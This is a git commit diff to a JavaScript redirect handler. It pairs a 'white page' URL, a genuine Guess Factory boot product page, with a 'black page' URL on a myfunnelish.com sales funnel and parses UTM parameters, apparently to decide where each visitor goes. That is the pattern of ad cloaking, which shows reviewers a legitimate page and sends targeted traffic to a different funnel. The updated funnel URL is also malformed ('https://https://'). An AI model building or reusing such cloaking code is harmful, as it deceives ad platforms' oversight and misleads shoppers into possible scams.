ee6383406a56b9183642a123a9803565eed3571e
Asif-Moon <asifaslam.ch94@gmail.com>
2025-01-29 19:05:36 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
     const whitePageURL = "https://www.guessfactory.com/us/en/shoes/all-shoes/boots-and-booties/flirra-quilted-hiker-boots-off-white/GFFLIRRA-IVO01.html";
-    const blackPageURL = "https://adffuaorrd.myfunnelish.com/imbassd-1736979042571105-1737989463763779";
+    const blackPageURL = "https://https://adffuaorrd.myfunnelish.com/chelsea-boden-boots-1737384020203844";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
